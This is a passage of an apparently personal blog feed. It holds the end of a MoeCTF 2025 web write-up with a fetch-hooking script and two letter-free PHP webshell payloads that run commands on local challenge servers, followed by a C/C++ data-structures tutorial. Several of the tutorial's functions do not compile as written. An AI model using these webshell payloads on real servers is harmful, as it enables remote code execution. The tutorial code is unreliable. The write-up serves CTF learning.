operator">=</span> <span class="token keyword">await</span> <span class="token function">originalFetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> verifyResponse <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">originalFetch</span><span class="token punctuation">(</span><span class="token string">"/verify"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>      <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">answers</span><span class="token operator">:</span> data<span class="token punctuation">.</span>numbers<span class="token punctuation">,</span>        <span class="token literal-property property">token</span><span class="token operator">:</span> data<span class="token punctuation">.</span>token      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> verifyData <span class="token operator">=</span> <span class="token keyword">await</span> verifyResponse<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>verifyData<span class="token punctuation">.</span>correct<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"FLAG: "</span> <span class="token operator">+</span> verifyData<span class="token punctuation">.</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> response<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">originalFetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"#decipherComputerChallengeStartBTN"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-none"><code class="language-none">moectf&#123;e56ad1de-0562-9a9a-213f-8da4bd1ad497&#125;</code></pre><h2 id="这是webshell">这是…Webshell？</h2><blockquote><p>这也不让，那也不让，这我咋做？</p></blockquote><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell| 离别歌</a></p><p>原理参考上文，用<code>hackbar</code>发送请求：</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:14333&#x2F;?shell&#x3D;$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;); $__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); $___&#x3D;$$__;$_($___[_]);value:_&#x3D;phpinfo();</code></pre><pre class="language-none"><code class="language-none">moectf&#123;6f88c899-f037-947f-4432-0607658c9b2b&#125;</code></pre><h2 id="这是webshell_revenge">这是…Webshell?_revenge</h2><blockquote><p>这下彻底没得做了…吧？</p></blockquote><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇| 离别歌</a></p><p>原理参考上文，用<code>burpsuite</code>抓包并发送请求：</p><pre class="language-none"><code class="language-none">POST &#x2F;?shell&#x3D;?&gt;&lt;?&#x3D;&#96;.+&#x2F;%3f%3f%3f&#x2F;%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]&#96;%3b?&gt; HTTP&#x2F;1.1Host: 127.0.0.1:50230sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;139&quot;, &quot;Not;A&#x3D;Brand&quot;;v&#x3D;&quot;99&quot;sec-ch-ua-mobile: ?0sec-ch-ua-platform: &quot;Windows&quot;Accept-Language: zh-CN,zh;q&#x3D;0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;139.0.0.0 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryTraeCTFAccept-Encoding: gzip, deflate, brConnection: closeContent-Length: 165------WebKitFormBoundaryTraeCTFContent-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.txt&quot;Content-Type: text&#x2F;plainenv------WebKitFormBoundaryTraeCTF--</code></pre><pre class="language-none"><code class="language-none">moectf&#123;97583404-f843-e747-6744-e9bc4ff6c536&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;moectf2025_web_wp&quot;&gt;MoeCTF2025_Web_wp&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;不看小说做不出来也无妨&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;环境配置&quot;&gt;环境配置&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;s</summary>
      
    
    
    
    <category term="笔记" scheme="https://saintcen.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="https://saintcen.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>数据结构（C语言版）</title>
    <link href="https://saintcen.github.io/2025/09/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88C%E8%AF%AD%E8%A8%80%E7%89%88%EF%BC%89/"/>
    <id>https://saintcen.github.io/2025/09/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88C%E8%AF%AD%E8%A8%80%E7%89%88%EF%BC%89/</id>
    <published>2025-09-25T16:00:00.000Z</published>
    <updated>2025-09-25T11:16:27.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="data-structure">Data Structure</h1><h2 id="线性表">线性表</h2><h3 id="顺序表">顺序表</h3><pre class="language-c++" data-language="c++"><code class="language-c++">#define MAXSIZE 100typedef int ElemType;typedef struct &#123;    ElemType *elem;    int length;&#125; Sqlist;&#x2F;&#x2F;初始化void InitList(Sqlist &amp;L) &#123;    L.elem &#x3D; new ElemType[MAXSIZE];    if (!L.elem) return;    L.length &#x3D; 0;&#125;&#x2F;&#x2F;取值void GetElem(Sqlist L, int i, ElemType &amp;e) &#123;    if (i &lt; 1 || i &gt; L.length) return;    e &#x3D; L.elem[i - 1];&#125;&#x2F;&#x2F;定位int LocateElem(Sqlist L, ElemType e) &#123;    for (int i &#x3D; 0; i &lt; L.length; i++) &#123;        if (L.elem[i] &#x3D;&#x3D; e) return i + 1;    &#125;    return 0;&#125;&#x2F;&#x2F;插入void InsertElem(Sqlist &amp;L, int i, ElemType e) &#123;    if (i &lt; 1 || i &gt; L.length + 1) return;    if (L.length &#x3D;&#x3D; MAXSIZE) return;    for (int j &#x3D; L.length - 1; j &gt;&#x3D; i - 1; j--) &#123;        L.elem[j + 1] &#x3D; L.elem[j];    &#125;    L.elem[i - 1] &#x3D; e;    L.length++;&#125;&#x2F;&#x2F;删除void DeleteElem(Sqlist &amp;L, int i) &#123;    if (i &lt; 1 || i &gt; L.length) return;    for (int j &#x3D; i; j &lt; L.length; j++) &#123;        L.elem[j - 1] &#x3D; L.elem[j];    &#125;    L.length--;&#125;</code></pre><h3 id="单链表">单链表</h3><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;using namespace std;typedef int ElemType;typedef struct Node &#123;    ElemType data;    struct Node* next;&#125;Node,*LinkList;&#x2F;&#x2F; 初始化(带头结点)void InitList(LinkList &amp;L) &#123;    L &#x3D; (Node*)malloc(sizeof(Node));    L-&gt;next &#x3D; NULL;    &#x2F;&#x2F;若不带头结点，直接L &#x3D; NULL;&#125;&#x2F;&#x2F; 求表长int Length(LinkList L)&#123;    int len &#x3D; 0;    Node *p &#x3D; L;    while(p-&gt;next!&#x3D;NULL)&#123;        p &#x3D; p-&gt;next;        len++;    &#125;    return len;&#125;&#x2F;&#x2F; 取值void GetElem(LinkList L, int i, ElemType &amp;e) &#123;    Node* p &#x3D; L;    int j &#x3D; 0;    while (p &amp;&amp; j &lt; i) &#123;        p &#x3D; p-&gt;next;        j++;    &#125;    if (!p || j &gt; i) return;    e &#x3D; p-&gt;data;&#125;&#x2F;&#x2F; 查找Node* LocateNode(LinkList L, ElemType e) &#123;    Node* p &#x3D; L-&gt;next;    while (p &amp;&amp; p-&gt;data !&#x3D; e) &#123;        p &#x3D; p-&gt;next;    &#125;    return p;&#125;&#x2F;&#x2F;插入void insertNode(LinkList &amp;L, int i, ElemType e) &#123;    Node* p &#x3D; L;    int j &#x3D; 0;    while (p &amp;&amp; j &lt; i - 1) &#123;        p &#x3D; p-&gt;next;        j++;    &#125;    if (!p) return;    Node* s &#x3D; new Node;    s-&gt;data &#x3D; e;    s-&gt;next &#x3D; p-&gt;next;    p-&gt;next &#x3D; s;&#125;&#x2F;&#x2F;删除void deleteNode(LinkList &amp;L, int i) &#123;    Node* p &#x3D; L;    int j &#x3D; 0;    while (p &amp;&amp; j &lt; i - 1) &#123;        p &#x3D; p-&gt;next;        j++;    &#125;    if (!p-&gt;next||!p) return;    Node* q &#x3D; p-&gt;next;    p-&gt;next &#x3D; q-&gt;next;    delete q;&#125;&#x2F;&#x2F;头插法void createList_H(LinkList &amp;L, int n) &#123;    L &#x3D; new Node; &#x2F;&#x2F; L固定为头结点    L-&gt;next &#x3D; NULL;    for (int i &#x3D; 0; i &lt; n; i++) &#123;        Node* p &#x3D; new Node;        cin &gt;&gt; p-&gt;data;        p-&gt;next &#x3D; L-&gt;next;        L-&gt;next &#x3D; p;    &#125;&#125;&#x2F;&#x2F;尾插法void createList_R(Node* &amp;L, int n) &#123;    L &#x3D; new Node; &#x2F;&#x2F;L为固定头结点    L-&gt;next &#x3D; NULL;    Node* r &#x3D; L;    for (int i &#x3D; 0; i &lt; n; i++) &#123;        Node* p &#x3D; new Node;        cin &gt;&gt; p-&gt;data;        p-&gt;next &#x3D; NULL;        r-&gt;next &#x3D; p;        r &#x3D; p;    &#125;    &#x2F;&#x2F;循环列表，p-&gt;next &#x3D; L-&gt;next;&#125;&#x2F;&#x2F;遍历void printlist(LinkList L)&#123;     Node *p &#x3D; L;     while (p) &#123;           printf(&quot;%d &quot;, p-&gt;data);           p &#x3D; p-&gt;next;     &#125;     printf(&quot;\n&quot;);&#125;</code></pre><h3 id="双链表">双链表</h3><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;using namespace std;typedef int Elemtype;&#x2F;&#x2F; 定义双链表节点typedef struct DNode &#123;    Elemtype data;    struct DNode* prior;    struct DNode* next;&#125; DNode, *DList;&#x2F;&#x2F; 初始化双链表DList initList() &#123;    DNode* head &#x3D; new DNode();    head-&gt;prior &#x3D; nullptr;    head-&gt;next &#x3D; nullptr;    return head;&#125;&#x2F;&#x2F; 创建双链表void createList(DList &amp;L, int n) &#123;    DNode* p &#x3D; L;    for (int i &#x3D; 0; i &lt; n; i++) &#123;        DNode* newNode &#x3D; new DNode;        cin &gt;&gt; newNode-&gt;data;        newNode-&gt;prior &#x3D; p;        newNode-&gt;next &#x3D; nullptr;        p-&gt;next &#x3D; newNode;        p &#x3D; newNode;    &#125;    &#x2F;&#x2F;循环链表，newNode-&gt;next &#x3D; L-&gt;next;L-&gt;next-&gt;prior &#x3D; newNode;&#125;&#x2F;&#x2F; 插入操作void insertNode(DList &amp;L, int pos, Elemtype e) &#123;    DNode* p &#x3D; L;    int i &#x3D; 0;    while (p &amp;&amp; i &lt; pos) &#123;        p &#x3D; p-&gt;next;        i++;    &#125;    if (!p) &#123;        return;    &#125;    DNode* newNode &#x3D; new DNode;    newNode-&gt;data &#x3D; e;    newNode-&gt;next &#x3D; p-&gt;next;    newNode-&gt;prior &#x3D; p;    if (p-&gt;next) &#123;        p-&gt;next-&gt;prior &#x3D; newNode;    &#125;    p-&gt;next &#x3D; newNode;&#125;&#x2F;&#x2F; 删除操作void deleteNode(DList &amp;L, int pos) &#123;    DNode* p &#x3D; L-&gt;next;    int i &#x3D; 0;    while (p &amp;&amp; i &lt; pos) &#123;        p &#x3D; p-&gt;next;        i++;    &#125;    if (!p) &#123;        return;    &#125;    if (p-&gt;prior) &#123;        p-&gt;prior-&gt;next &#x3D; p-&gt;next;    &#125;    if (p-&gt;next) &#123;        p-&gt;next-&gt;prior &#x3D; p-&gt;prior;    &#125;    delete p;&#125;&#x2F;&#x2F; 正向遍历void traverseForward(DList L) &#123;    DNode* p &#x3D; L-&gt;next;    while (p) &#123;        cout &lt;&lt; p-&gt;data &lt;&lt; &quot; &quot;;        p &#x3D; p-&gt;next;    &#125;    cout &lt;&lt; endl;&#125;&#x2F;&#x2F; 反向遍历void traverseBackward(DList L) &#123;    DNode* p &#x3D; L;    while (p-&gt;next) &#123;        p &#x3D; p-&gt;next;    &#125;    while (p !&#x3D; L) &#123;        cout &lt;&lt; p-&gt;data &lt;&lt; &quot; &quot;;        p &#x3D; p-&gt;prior;    &#125;    cout &lt;&lt; endl;&#125;</code></pre><h4 id="stl">STL</h4><p><strong>list</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;list&gt;#include&lt;iostream&gt;using namespace std;int main()&#123;    list&lt;int&gt; l;    &#x2F;&#x2F; 插入元素    l.push_back(10);    l.push_front(5);    &#x2F;&#x2F; 输出    for (int val : l) &#123;        cout &lt;&lt; val &lt;&lt; &quot; &quot;;    &#125;    &#x2F;&#x2F; 查找元素    auto it &#x3D; find(l.begin(), l.end(), 10);    if (it !&#x3D; l.end()) &#123;        cout &lt;&lt; distance(l.begin(),it) &lt;&lt; endl;    &#125;    &#x2F;&#x2F; 删除元素    l.erase(l.begin());    &#x2F;&#x2F; 反转链表    l.reverse();    &#x2F;&#x2F; 排序链表    l.sort();    &#x2F;&#x2F; 删除相邻的重复元素    l.push_back(20);    l.push_back(20);    l.unique();&#125;</code></pre><h3 id="静态链表">静态链表</h3><pre class="language-c++" data-language="c++"><code class="language-c++">typedef int ElemType;#define MAXSIZE 50typedef struct&#123;    ElemType data;    int next;&#x2F;&#x2F; 存储地址(具体数值)&#125;SLinkList[MAXSIZE];</code></pre><h2 id="栈与队列">栈与队列</h2><h3 id="栈">栈</h3><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef int Elemtype;&#x2F;&#x2F;顺序存储typedef struct&#123;    Elemtype *top;    Elemtype *base;    int size;&#125; SqStack;void Init(SqStack &amp;s)&#123;    s.base &#x3D; new Elemtype[MAXSIZE];    s.top &#x3D; s.base;    s.size &#x3D; MAXSIZE;&#125;bool IsEmpty(SqStack s)&#123;    return s.base &#x3D;&#x3D; s.top;&#125;bool IsFull(SqStack s)&#123;    return (s.top - s.base) &#x3D;&#x3D; s.size;&#125;void Push(SqStack &amp;s, Elemtype e)&#123;    if (IsFull(s))    &#123;        return;    &#125;    *s.top &#x3D; e;    s.top++;&#125;Elemtype Pop(SqStack &amp;s, Elemtype &amp;e)&#123;    if (IsEmpty(s))    &#123;        return;    &#125;    s.top--;    e &#x3D; *s.top;&#125;void Print(SqStack &amp;s)&#123;    if (IsEmpty(s))    &#123;        return;    &#125;    for (Elemtype *p &#x3D; s.base; p !&#x3D; s.top; p++)    &#123;        cout &lt;&lt; *p &lt;&lt; &quot; &quot;;    &#125;    cout &lt;&lt; endl;&#125;Elemtype GetTop(SqStack s)&#123;    if (IsEmpty(s))    &#123;        return;    &#125;    Elemtype e &#x3D; *s.top;    return e;&#125;&#x2F;&#x2F; 链式存储typedef struct Linknode&#123;    Elemtype data;    struct Linknode *next;&#125; Linknode, *LiStack;void Init(LiStack &amp;s)&#123;    s &#x3D; NULL;&#125;void Push(LiStack &amp;s, Elemtype e)&#123;    LiStack p &#x3D; new Linknode;    p-&gt;data &#x3D; e;    p-&gt;next &#x3D; s;    s &#x3D; p;&#125;void Pop(LiStack &amp;s, Elemtype &amp;e)&#123;    if (s &#x3D;&#x3D; NULL)        return;    e &#x3D; s-&gt;data;    LiStack p &#x3D; s;    s &#x3D; s-&gt;next;    delete p;&#125;Elemtype GetTop(LiStack s)&#123;    if (s !&#x3D; NULL)        return s-&gt;data;    return -1;&#125;&#x2F;&#x2F; 共享存储typedef struct&#123;    Elemtype *base;    Elemtype *top1;    Elemtype *top2;    int capacity;&#125; SharedStack;</code></pre><h4 id="stl-1">STL</h4><p><strong>stack</strong></p><ul><li><code>top()</code> 访问栈顶元素（如果栈为空，此处会出错）</li><li><code>push(x)</code> 向栈中插入元素 x</li><li><code>pop()</code> 删除栈顶元素</li><li><code>size()</code> 查询容器中的元素数量</li><li><code>empty()</code> 询问容器是否为空</li></ul><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;stack&gt;using namespace std;int main()&#123;stack&lt;int&gt; s1;s1.push(2);s1.push(1);cout &lt;&lt; s1.size() &lt;&lt; endl;s1.pop();s1.pop();cout &lt;&lt; s1.empty() &lt;&lt; endl;&#125;</code></pre><h3 id="队列">队列</h3><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;using namespace std;#define maxsize 100typedef int ElemType;typedef struct &#123;    ElemType *base;    int front;    int rear;&#125; SqQueue;&#x2F;&#x2F; 可作为单向队列或循环队列，这里视为循环队列&#x2F;&#x2F; 初始化void InitQueue(SqQueue &amp;q) &#123;    q.base &#x3D; new ElemType[maxsize];    if (!q.base) &#123;        return;    &#125;    q.front &#x3D; 0;    q.rear &#x3D; 0;&#125;&#x2F;&#x2F; 长度int QueueLength(SqQueue q) &#123;    return (q.rear - q.front + maxsize) % maxsize;&#125;&#x2F;&#x2F; 判断是否为空bool IsEmpty(SqQueue q) &#123;    return q.front &#x3D;&#x3D; q.rear;&#125;&#x2F;&#x2F; 判断是否已满bool IsFull(SqQueue q) &#123;    return (q.rear + 1) % maxsize &#x3D;&#x3D; q.front;&#125;&#x2F;&#x2F; 入队void EnQueue(SqQueue &amp;q, ElemType e) &#123;    if (IsFull(q)) &#123;        return;    &#125;    q.base[q.rear] &#x3D; e;    q.rear &#x3D; (q.rear + 1) % maxsize;&#125;&#x2F;&#x2F; 出队void DeQueue(SqQueue &amp;q, ElemType &amp;e) &#123;    if (IsEmpty(q)) &#123;        return;    &#125;    e &#x3D; q.base[q.front];    q.front &#x3D; (q.front + 1) % maxsize;&#125;&#x2F;&#x2F; 获取队头元素ElemType GetHead(SqQueue q) &#123;    if (!IsEmpty(q)) &#123;        return q.base[q.front];    &#125;    return -1;&#125;&#x2F;&#x2F; 打印void PrintQueue(SqQueue q) &#123;    if (IsEmpty(q)) &#123;        return;    &#125;    int i &#x3D; q.front;    while (i !&#x3D; q.rear) &#123;        cout &lt;&lt; q.base[i] &lt;&lt; &quot; &quot;;        i &#x3D; (i + 1) % maxsize;    &#125;    cout &lt;&lt; endl;&#125;&#x2F;&#x2F; 队列链式存储(带头结点)&#x2F;&#x2F; 节点定义typedef struct QNode&#123;    ElemType data;    struct QNode *next;&#125;QNode;&#x2F;&#x2F; 链队列定义typedef struct &#123;    QNode *front;    QNode *rear;&#125;LinkQueue;&#x2F;&#x2F; 初始化队列void InitQueue(LinkQueue &amp;Q) &#123;    Q.front &#x3D; new QNode;    Q.rear &#x3D; Q.front;    Q.front-&gt;next &#x3D; NULL;&#125;&#x2F;&#x2F; 判断为空bool IsEmpty(LinkQueue Q)&#123;    return (Q.front &#x3D;&#x3D; Q.rear);&#125;&#x2F;&#x2F; 入队操作void EnQueue(LinkQueue &amp;Q, ElemType e) &#123;    QNode *newNode &#x3D; new QNode;    newNode-&gt;data &#x3D; e;    newNode-&gt;next &#x3D; NULL;    Q.rear-&gt;next &#x3D; newNode;    Q.rear &#x3D; newNode;&#125;&#x2F;&#x2F; 出队操作void DeQueue(LinkQueue &amp;Q, ElemType &amp;e) &#123;    if (IsEmpty(Q)) &#123;        return;    &#125;    QNode *temp &#x3D; Q.front-&gt;next;    e &#x3D; temp-&gt;data;    Q.front-&gt;next &#x3D; temp-&gt;next;    if (temp &#x3D;&#x3D; Q.rear) &#123;        Q.rear &#x3D; Q.front;    &#125;    delete temp;&#125;&#x2F;&#x2F; 获取队头元素ElemType GetFront(LinkQueue Q) &#123;    if (IsEmpty(Q)) &#123;        return -1;    &#125;    return Q.front-&gt;next-&gt;data;&#125;</code></pre><h4 id="stl-2">STL</h4><p><strong>queue</strong></p><ul><li><code>front()</code> 访问队首元素（如果队列为空，此处会出错）</li><li><code>push(x)</code> 向队列中插入元素 x</li><li><code>pop()</code> 删除队首元素</li><li><code>size()</code> 查询容器中的元素数量</li><li><code>empty()</code> 询问容器是否为空</li></ul><p><strong>deque</strong></p><ul><li><code>push_front(x)</code> 在队首插入元素 x</li><li><code>push_back(x)</code> 在队尾插入元素 x</li><li><code>pop_front()</code> 删除队首元素</li><li><code>pop_back()</code> 删除队尾元素</li><li><code>front()</code> 访问队首元素</li><li><code>back()</code> 访问队尾元素</li><li><code>size()</code> 查询元素数量</li><li><code>empty()</code> 判断是否为空</li></ul><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;queue&gt;#include&lt;iostream&gt;using namespace std;int main()&#123;&#x2F;&#x2F; 单向队列queue&lt;int&gt; q1;q1.push(2);q1.push(1);q1.pop();cout &lt;&lt; q1.size() &lt;&lt; endl;cout &lt;&lt; q1.front() &lt;&lt; endl;q1.pop();cout &lt;&lt; q1.empty() &lt;&lt; endl;&#x2F;&#x2F; 双向队列deque&lt;int&gt; dq;dq.push_back(3);dq.push_front(1);dq.pop_front();dq.push_front(5);dq.pop_back();dq.pop_back();cout &lt;&lt; dq.size() &lt;&lt; endl;cout &lt;&lt; dq.empty() &lt;&lt; endl;&#125;</code></pre><h4 id="优先队列priority_queue">优先队列(priority_queue)</h4><pre class="language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F; 默认最小堆(原理其实是构建完全二叉树进行堆排序，因此初始化时有数组和比较条件)priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; pq&#x2F;&#x2F; 自定义堆struct cmp &#123;    bool operator()(int a, int b) &#123;        return a &lt; b; &#x2F;&#x2F; 最大堆    &#125;&#125;;priority_queue&lt;int, vector&lt;int&gt;, cmp&gt; pq;&#x2F;&#x2F; 插入元素int element &#x3D; 1;pq.push(element);&#x2F;&#x2F; 访问顶部元素int top &#x3D; pq.top();&#x2F;&#x2F; 删除顶部元素pq.pop();&#x2F;&#x2F; 检查是否为空bool isEmpty &#x3D; pq.empty();&#x2F;&#x2F; 获取元素数量size_t size &#x3D; pq.size();</code></pre><h3 id="数组">数组</h3><p>以二维数组为例：</p><p><span class="math display"><em>L</em><em>O</em><em>C</em>(<em>i</em>, <em>j</em>) = <em>L</em><em>O</em><em>C</em>(0, 0) + (<em>n</em> * <em>i</em> + <em>j</em>) * <em>L</em></span></p><p>其中<span class="math inline"><em>L</em></span>为每个数组元素所占的单元。</p><p><strong>特殊矩阵的压缩存储</strong></p><p>1.对称矩阵</p><p>对于 n 阶矩阵 A，若<span class="math inline"><em>a</em><sub><em>i</em>, <em>j</em></sub> = <em>a</em><sub><em>j</em>, <em>i</em></sub></span>，则为对称矩阵。假设我们要压缩成一维数组，求解下标<span class="math inline"><em>k</em></span>有以下公式：</p><p><span class="math display">$$i&gt;=j,k = \frac{i(i-1)}{2}+j-1\\i&lt;j,k = \frac{j(j-1)}{2}+i-1\\$$</span></p><p>2.三角矩阵</p><p><span class="math display">$$上三角：i&gt;j,k =\frac{n(n+1)}{2},i&lt;=j,\frac{(2n-i+2)(i-1)}{2}+j-i\\下三角：i&gt;j,k = \frac{i(i-1)}{2}+j-1,i&lt;=j,\frac{n(n+1)}{2}$$</span></p><p>3.带状矩阵</p><p>第 1 行和第 n行有两个元，其余行均有三个元，（形成三条对角线），对<span class="math inline"><em>a</em><sub><em>i</em>, <em>j</em></sub></span>若压缩成一维矩阵有：</p><p><span class="math display"><em>k</em> = 2<em>i</em> + <em>j</em> − 3</span></p><p>4.稀疏矩阵</p><p>将稀疏分布的矩阵转为三元组（行标<span class="math inline"><em>i</em></span>，列标<span class="math inline"><em>j</em></span>，值<span class="math inline"><em>a</em><sub><em>i</em>, <em>j</em></sub></span>）</p><pre class="language-c++" data-language="c++"><code class="language-c++">typedef struct&#123;    int col;    int row;    int data;&#125;Matrix;</code></pre><h4 id="stl-3">STL</h4><p><strong>vector</strong></p><ul><li><p><code>push_back(x)</code> 在尾部插入元素 x</p></li><li><p><code>pop_back()</code> 删除尾部元素</p></li><li><p><code>front()</code> 访问首元素</p></li><li><p><code>back()</code> 访问尾元素</p></li><li><p><code>size()</code> 查询元素数量</p></li><li><p><code>empty()</code> 判断是否为空</p></li><li><p><code>clear()</code> 清空所有元素</p></li></ul><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;vector&gt;#include&lt;iostream&gt;using namespace std;int main()&#123;vector&lt;int&gt; vec;vec.push_back(1);vec.push_back(2);vec.pop_back();vec.push_back(3);cout &lt;&lt; vec.size() &lt;&lt; endl;cout &lt;&lt; vec.front() &lt;&lt; endl;cout &lt;&lt; vec.back() &lt;&lt; endl;cout &lt;&lt; vec[1] &lt;&lt; endl;vec.clear();cout &lt;&lt; vec.empty() &lt;&lt; endl;vector&lt;vector&lt;int&gt;&gt; matrix(3, vector&lt;int&gt;(2, 0));&#x2F;&#x2F; 3行，2列，每行填充0matrix[0][0] &#x3D; 1;matrix[1].push_back(3);vector&lt;int&gt; new_row &#x3D; &#123;5, 7, 9&#125;;matrix.push_back(new_row);for (int i &#x3D; 0; i &lt; matrix.size(); i++) &#123;    for (int j &#x3D; 0; j &lt; matrix[i].size(); j++) &#123;          cout &lt;&lt; matrix[i][j] &lt;&lt; &quot; &quot;;    &#125;    cout &lt;&lt; endl;&#125;&#125;</code></pre><h2 id="串">串</h2><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;using namespace std;#define maxlen 255&#x2F;&#x2F; 顺序存储typedef struct&#123;    char ch[maxlen];    int length;&#125;SString;&#x2F;&#x2F; 堆分配存储typedef struct&#123;    char *ch;    int length;&#125;HString;&#x2F;&#x2F; 链式存储typedef struct CharNode &#123;    char ch;    struct CharNode *next;&#125; CharNode, *CharPtr;typedef struct &#123;    CharPtr head;    int length;&#125; LString;&#x2F;&#x2F; 字串定位算法&#x2F;&#x2F; Brute-Forceint BF(SString s,SSting t,int pos)&#123;    int i &#x3D; pos;    int j &#x3D; 1;    while(i&lt;&#x3D;s.length &amp;&amp; j&lt;&#x3D;t.length())&#123;        if(s.ch[i]&#x3D;&#x3D;t.ch[j])&#123;            i++;            j++;        &#125;            else&#123;                i &#x3D; i - j + 2;                j &#x3D; 1;        &#125;    &#125;   if(j&gt;t.length) return i-t.length;   else return 0;&#125;&#x2F;&#x2F; KMPvector&lt;int&gt; Next(const string &amp;j) &#123;    int m &#x3D; j.length();    vector&lt;int&gt; next(m + 1, 0);    int k &#x3D; 0;    next[0] &#x3D; -1;    for (int i &#x3D; 1; i &lt; m; i++) &#123;        while (k &gt;&#x3D; 0 &amp;&amp; j[i] !&#x3D; j[k]) &#123;            k &#x3D; next[k];        &#125;        k++;        next[i + 1] &#x3D; k;    &#125;    return next;&#125;void KMP(const string &amp;t, const string &amp;j) &#123;    int n &#x3D; t.length();    int m &#x3D; j.length();        return;    &#125;    vector&lt;int&gt; next &#x3D; Next(j);    int i &#x3D; 0;    int k &#x3D; 0;    while (i &lt; n) &#123;        if (k &#x3D;&#x3D; -1 || t[i] &#x3D;&#x3D; j[k]) &#123;            i++;            k++;            if (k &#x3D;&#x3D; m) &#123;                cout &lt;&lt; t.substr(i - m) &lt;&lt; endl;                return;            &#125;        &#125; else &#123;            k &#x3D; next[k];        &#125;    return;&#125;</code></pre><h4 id="stl-4">STL</h4><p><strong>string</strong></p><p>长度：<code>s.size()</code>/<code>s.length()</code></p><p>查找字符（串）第一次出现的位置：<code>s.find(u)</code>/<code>s.find(t,pos)</code><strong>注：不是 KMP</strong></p><p>截取子串：<code>substr(pos,len)</code></p><p>插入：<code>insert(index,str)</code></p><p>替换字符串：<code>replace(first,second,str)</code></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include 